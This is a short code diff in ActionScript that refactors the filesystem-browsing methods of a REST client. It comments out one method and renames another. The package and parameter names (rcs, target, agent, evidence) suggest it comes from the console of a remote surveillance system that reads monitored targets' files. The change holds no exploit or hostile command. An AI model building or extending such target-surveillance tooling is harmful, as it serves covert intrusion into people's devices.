@@ -95,16 +95,16 @@ package it.ht.rcs.console.evidence.rest
       resp.token = agent_status_(JSON.stringify(params));
     }
     
-    public function filesystem(targetId:String, agentId:String, filter:String, onResult:Function = null, onFault:Function = null):void
+  /*  public function filesystem(targetId:String, agentId:String, filter:String, onResult:Function = null, onFault:Function = null):void
     {
       var resp:CallResponder = DB.getCallResponder(onResult, onFault);
       resp.token = filesystem_(targetId, agentId, filter);
-    }
+    }*/
     
-    public function filesystem2(targetId:String, agentId:String, path:String, onResult:Function = null, onFault:Function = null):void
+    public function filesystem(targetId:String, agentId:String, path:String, onResult:Function = null, onFault:Function = null):void
     {
       var resp:CallResponder = DB.getCallResponder(onResult, onFault);
-      resp.token = filesystem2_(targetId, agentId, path);
+      resp.token = filesystem_(targetId, agentId, path);
     }
     
     public function show(id:String, target:String, onResult:Function=null, onFault:Function=null):void
